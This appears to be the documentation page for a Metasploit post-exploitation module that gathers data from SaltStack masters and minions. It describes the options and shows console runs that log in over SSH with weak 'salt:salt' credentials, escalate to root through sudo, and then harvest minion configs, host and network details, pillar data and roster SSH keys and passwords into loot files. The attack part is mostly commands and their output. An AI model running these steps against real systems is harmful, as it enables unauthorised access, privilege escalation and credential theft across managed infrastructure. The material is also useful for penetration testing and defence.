## Vulnerable Application

This module gathers data from salt stack minions and masters.

Data gathered from minions:

1. salt minion config file

Data gathered from masters:

1. minion list (denied, pre, rejected, accepted)
1. minion hostname/ip/os (depending on module settings)
1. SLS
1. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed
1. minion config files
1. pillar data

## Verification Steps

1. Install salt and configure it
1. Start msfconsole
1. Get a session with permissions required (root typically)
1. Do: `use post/multi/gather/saltstack_salt`
1. Do: `set session #`
1. Do: `run`
1. You should get all the salt stack info

## Options

### GETHOSTNAME

Gather hostname from the minions. Defaults to `true`

### GETIP

Gather IP from the minions. Defaults to `true`

### GETOS

Gather OS from the minions. Defaults to `true`

### MINIONS

Which minions to gather info from. Defaults to `*` (all)

### TIMEOUT

Timeout value for running the `salt` commands. Bigger salt networks will need a bigger value. Defaults to `120`

## Scenarios

### Minion 3002.2 on Ubuntu 20.04

#### Setup

```
[*] Processing salt.rb for ERB directives.
resource (salt.rb)> use auxiliary/scanner/ssh/ssh_login
resource (salt.rb)> set username salt
username => salt
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> set rhosts 333.333.3.333
rhosts => 333.333.3.333
resource (salt.rb)> run
[+] 333.333.3.333:22 - Success: 'salt:salt' 'uid=1000(salt) gid=1000(salt) groups=1000(salt),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd) Linux salt-minion 5.4.0-58-generic #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:34863 -> 333.333.3.333:22) at 2021-04-10 12:50:12 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (salt.rb)> use post/multi/manage/sudo
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> run
[*] SUDO: Attempting to upgrade to UID 0 via sudo
[*] Sudoing with password `salt'.
[+] SUDO: Root shell secured.
[*] Post module execution completed
```

#### Module Run

```
resource (salt.rb)> use post/multi/gather/saltstack_salt
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set verbose true
verbose => true
resource (salt.rb)> run
[!] SESSION may not be compatible with this module.
[*] Looking for salt minion config files
[+] Minion master: 444.444.4.444
[+] 333.333.3.333:22 - minion file successfully retrieved and saved on /root/.msf4/loot/20210410125036_default_333.333.3.333_saltstack_salt_minion_561296.bin
[*] Post module execution completed
msf6 post(multi/gather/saltstack_salt) > cat /root/.msf4/loot/20210410125036_default_333.333.3.333_saltstack_salt_minion_561296.bin
[*] exec: cat /root/.msf4/loot/20210410125036_default_333.333.3.333_saltstack_salt_minion_561296.bin

---
master: 444.444.4.444
```

### Minion 3003 on Windows Server 2012

```
msf6 post(multi/gather/saltstack_salt) > rexploit
[*] Reloading module...

[!] SESSION may not be compatible with this module.
[*] Looking for salt minion config files
[+] Minion master: 1.1.1.1
[+] 2.2.2.2:49299 - minion file successfully retrieved and saved to /home/h00die/.msf4/loot/20210502093836_default_2.2.2.2_saltstack_minion_337783.bin
[*] Looking for salt minion config files
[+] Minion master: 1.1.1.1
[+] 2.2.2.2:49299 - minion file successfully retrieved and saved to /home/h00die/.msf4/loot/20210502093837_default_2.2.2.2_saltstack_minion_063036.bin
[*] Post module execution completed
```

### Master 3002.2 on Ubuntu 20.04

#### Setup

```
[*] Processing salt.rb for ERB directives.
resource (salt.rb)> use auxiliary/scanner/ssh/ssh_login
resource (salt.rb)> set username salt
username => salt
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> set rhosts 444.444.4.444
rhosts => 444.444.4.444
resource (salt.rb)> run
[+] 444.444.4.444:22 - Success: 'salt:salt' 'uid=1000(salt) gid=1000(salt) groups=1000(salt),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd) Linux salt-master 5.4.0-58-generic #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:35097 -> 444.444.4.444:22) at 2021-04-10 12:11:29 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (salt.rb)> use post/multi/manage/sudo
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> run
[*] SUDO: Attempting to upgrade to UID 0 via sudo
[*] Sudoing with password `salt'.
[+] SUDO: Root shell secured.
[*] Post module execution completed
```

#### Module Run

```
resource (salt.rb)> use post/multi/gather/saltstack_salt
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set verbose true
verbose => true
resource (salt.rb)> run
[!] SESSION may not be compatible with this module.
[*] Attempting to list minions
[*] minions:
- mac_minion
- salt-minion
- window-salt-minion
minions_denied: []
minions_pre: []
minions_rejected: []
[+] 333.333.3.333:22 - minion file successfully retrieved and saved to /.msf4/loot/20210502081041_default_333.333.3.333_saltstack_minion_980449.bin
[+] Minions List
============

 Status    Minion Name
 ------    -----------
 Accepted  mac_minion
 Accepted  salt-minion
 Accepted  window-salt-minion

[*] Gathering data from minions (this can take some time)
[*] salt-minion:
  network.get_hostname: salt-minion
  network.interfaces:
    ens160:
      hwaddr: 00:0c:29:00:00:00
      inet:
      - address: 444.444.4.444
        broadcast: 192.168.2.255
        label: ens160
        netmask: 255.255.255.0
      inet6:
      - address: fe80::20c:29ff:fe87:95b
        prefixlen: '64'
        scope: link
      up: true
    lo:
      hwaddr: 00:00:00:00:00:00
      inet:
      - address: 127.0.0.1
        broadcast: null
        label: lo
        netmask: 255.0.0.0
      inet6:
      - address: ::1
        prefixlen: '128'
        scope: host
      up: true
  status.version: 'Linux version 5.4.0-72-generic (buildd@lcy01-amd64-019) (gcc version
    9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021'
  system.get_system_info: "Traceback (most recent call last):\n  File \"/usr/lib/python3/dist-packages/salt/minion.py\",
    line 2083, in _thread_multi_return\n    return_data = minion_instance._execute_job_function(\n
    \ File \"/usr/lib/python3/dist-packages/salt/minion.py\", line 1846, in _execute_job_function\n
    \   return_data = self.executors[fname](opts, data, func, args, kwargs)\n  File
    \"/usr/lib/python3/dist-packages/salt/executors/direct_call.py\", line 12, in
    execute\n    return func(*args, **kwargs)\nTypeError: 'str' object is not callable\n"
mac_minion:
  network.get_hostname: h00dies-MBP.domain
  network.interfaces:
    awdl0:
      hwaddr: ca:6a:47:00:00:00
      inet6:
      - address: fe80::c86a:47ff:fe4a:39d2
        prefixlen: '64'
        scope: '0x9'
      up: true
    bridge0:
      hwaddr: 82:0f:16:00:00:00
      up: true
    en0:
      hwaddr: 80:e6:50:00:00:00
      inet:
      - address: 222.222.2.22
        broadcast: 192.168.2.255
        netmask: 255.255.255.0
      inet6:
      - address: fe80::ef:6155:1f8b:98df
        prefixlen: '64'
        scope: null
      up: true
    en1:
      hwaddr: 82:0f:16:00:00:00
      up: true
    en2:
      hwaddr: 82:0f:16:00:00:00
      up: true
    gif0:
      up: false
    llw0:
      hwaddr: ca:6a:47:00:00:00
      inet6:
      - address: fe80::c86a:47ff:fe4a:39d2
        prefixlen: '64'
        scope: '0xa'
      up: true
    lo0:
      inet:
      - address: 127.0.0.1
        netmask: 255.0.0.0
      inet6:
      - address: ::1
        prefixlen: '128'
        scope: null
      - address: fe80::1
        prefixlen: '64'
        scope: '0x1'
      up: true
    p2p0:
      hwaddr: 02:e6:50:00:00:00
      up: true
    stf0:
      up: false
  status.version: This method is unsupported on the current operating system!
  system.get_system_info: "Traceback (most recent call last):\n  File \"/opt/salt/lib/python3.7/site-packages/salt-3003-py3.7.egg/salt/minion.py\",
    line 2099, in _thread_multi_return\n    function_name, function_args, executors,
    opts, data\n  File \"/opt/salt/lib/python3.7/site-packages/salt-3003-py3.7.egg/salt/minion.py\",
    line 1861, in _execute_job_function\n    return_data = self.executors[fname](opts,
    data, func, args, kwargs)\n  File \"/opt/salt/lib/python3.7/site-packages/salt-3003-py3.7.egg/salt/loader.py\",
    line 1235, in __call__\n    return self.loader.run(run_func, *args, **kwargs)\n
    \ File \"/opt/salt/lib/python3.7/site-packages/salt-3003-py3.7.egg/salt/loader.py\",
    line 2268, in run\n    return self._last_context.run(self._run_as, _func_or_method,
    *args, **kwargs)\n  File \"/opt/salt/lib/python3.7/site-packages/salt-3003-py3.7.egg/salt/loader.py\",
    line 2283, in _run_as\n    return _func_or_method(*args, **kwargs)\n  File \"/opt/salt/lib/python3.7/site-packages/salt-3003-py3.7.egg/salt/executors/direct_call.py\",
    line 12, in execute\n    return func(*args, **kwargs)\nTypeError: 'str' object
    is not callable\n"
window-salt-minion:
  network.get_hostname: WIN-EDKFSE5QPAB
  network.interfaces:
    Intel(R) 82574L Gigabit Network Connection:
      hwaddr: 00:0C:29:00:00:00
      inet:
      - address: 555.555.5.555
        broadcast: 192.168.2.255
        gateway: 0.0.0.0
        label: Intel(R) 82574L Gigabit Network Connection
        netmask: 255.255.255.0
      inet6:
      - address: fe80::48f2:f6fd:3dc2:a4eb
        gateway: ''
      up: true
    Software Loopback Interface 1:
      hwaddr: ':::::'
      inet:
      - address: 127.0.0.1
        broadcast: 127.255.255.255
        gateway: ''
        label: Software Loopback Interface 1
        netmask: 255.0.0.0
      inet6:
      - address: ::1
        gateway: ''
      up: true
  status.version: "Traceback (most recent call last):\n  File \"c:\\salt\\bin\\lib\\site-packages\\salt-3003-py3.7.egg\\salt\\minion.py\",
    line 2099, in _thread_multi_return\n    function_name, function_args, executors,
    opts, data\n  File \"c:\\salt\\bin\\lib\\site-packages\\salt-3003-py3.7.egg\\salt\\minion.py\",
    line 1861, in _execute_job_function\n    return_data = self.executors[fname](opts,
    data, func, args, kwargs)\n  File \"c:\\salt\\bin\\lib\\site-packages\\salt-3003-py3.7.egg\\salt\\loader.py\",
    line 1235, in __call__\n    return self.loader.run(run_func, *args, **kwargs)\n
    \ File \"c:\\salt\\bin\\lib\\site-packages\\salt-3003-py3.7.egg\\salt\\loader.py\",
    line 2268, in run\n    return self._last_context.run(self._run_as, _func_or_method,
    *args, **kwargs)\n  File \"c:\\salt\\bin\\lib\\site-packages\\salt-3003-py3.7.egg\\salt\\loader.py\",
    line 2283, in _run_as\n    return _func_or_method(*args, **kwargs)\n  File \"c:\\salt\\bin\\lib\\site-packages\\salt-3003-py3.7.egg\\salt\\executors\\direct_call.py\",
    line 12, in execute\n    return func(*args, **kwargs)\nTypeError: 'str' object
    is not callable\n"
  system.get_system_info:
    bios_caption: 'PhoenixBIOS 4.0 Release 6.0     '
    bios_description: 'PhoenixBIOS 4.0 Release 6.0     '
    bios_details:
    - INTEL  - 6040000
    - 'PhoenixBIOS 4.0 Release 6.0     '
    bios_manufacturer: Phoenix Technologies LTD
    bios_version: INTEL  - 6040000
    bootup_state: Normal boot
    caption: WIN-EDKFSE5QPAB
    chassis_bootup_state: Safe
    chassis_sku_number: null
    description: ''
    dns_hostname: WIN-EDKFSE5QPAB
    domain: WORKGROUP
    domain_role: Standalone Server
    hardware_manufacturer: VMware, Inc.
    hardware_model: VMware Virtual Platform
    hardware_serial: VMware-56 4d 85 da 18 47 2c 63-c7 71 42 6b ab 7a c9 f1
    install_date: '2019-06-18 18:28:30'
    last_boot: '2021-04-30 14:21:48'
    name: WIN-EDKFSE5QPAB
    network_server_mode_enabled: true
    organization: ''
    os_architecture: 64-bit
    os_manufacturer: Microsoft Corporation
    os_name: Microsoft Windows Server 2012 Standard
    os_type: Server
    os_version: 6.2.9200
    part_of_domain: false
    pc_system_type: Desktop
    power_state: 0
    primary: true
    processor_cores: 2
    processor_manufacturer: GenuineIntel
    processor_max_clock_speed: 2600MHz
    processors: 2
    processors_logical: 2
    registered_user: Windows User
    status: OK
    system_directory: C:\Windows\system32
    system_drive: 'C:'
    system_type: x64-based PC
    thermal_state: Safe
    total_physical_memory: 4.000GB
    total_physical_memory_raw: '4294430720'
    users: 1
    windows_directory: C:\Windows
    workgroup: WORKGROUP
[+] 333.333.3.333:22 - minion data gathering successfully retrieved and saved to /.msf4/loot/20210502081051_default_333.333.3.333_saltstack_minion_337797.bin
[+] Found minion: salt-minion (444.444.4.444) - Linux version 5.4.0-72-generic (buildd@lcy01-amd64-019) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021
[+] Found minion: h00dies-MBP.domain (222.222.2.22) - 
[+] Found minion: WIN-EDKFSE5QPAB (555.555.5.555) - 6.2.9200
[*] Showing SLS
[+] 333.333.3.333:22 - SLS output successfully retrieved and saved to /.msf4/loot/20210502081057_default_333.333.3.333_saltstack_sls_969146.txt
[*] Loading roster
[+] Found SSH minion: web1 (192.168.42.1)
[+] Found SSH minion: web2 (192.168.42.2)
[+]   SSH key /tmp/id_rsa password hello
[-]   Unable to find salt-ssh priv key /tmp/id_rsa
[+] Found SSH minion: web3 (192.168.42.3)
[-]   Unable to find salt-ssh priv key /tmp/id_rsa2
[*] Looking for salt minion config files
[+] 333.333.3.333:22 - roster file successfully retrieved and saved to /.msf4/loot/20210502081101_default_333.333.3.333_saltstack_roster_292921.bin
[*] Gathering pillar data
[*] salt-minion:
  info: some data
mac_minion:
  info: some data
window-salt-minion:
  info: some data
[+] 333.333.3.333:22 - pillar data gathering successfully retrieved and saved to /.msf4/loot/20210502081106_default_333.333.3.333_saltstack_pillar_899591.bin
[*] Post module execution completed
msf6 post(multi/gather/saltstack_salt) > hosts

Hosts
=====

address        mac                name                    os_name                                 os_flavor                                             os_sp  purpose  info  comments
-------        ---                ----                    -------                                 ---------                                             -----  -------  ----  --------
222.222.2.22   80:e6:50:00:00:00  h00dies-MBP.domain      osx                                                                                                                 SaltStack minion to 333.333.3.333
333.333.3.333                                             linux                                                                                                               
444.444.4.444  00:0c:29:00:00:00  salt-minion                                                     Linux version 5.4.0-72-generic (buildd@lcy01-amd64-01                        SaltStack minion to 333.333.3.333
555.555.5.555  00:0C:29:00:00:00  WIN-EDKFSE5QPAB         Microsoft Windows Server 2012 Standard  6.2.9200                                                     Server         SaltStack minion to 333.333.3.333
192.168.42.1                      web1                                                                                                                                        SaltStack ssh minion to 333.333.3.333
192.168.42.2                      web2                    Unknown                                                                                              device         SaltStack ssh minion to 333.333.3.333
192.168.42.3                      web3                                                                                                                                        SaltStack ssh minion to 333.333.3.333

```
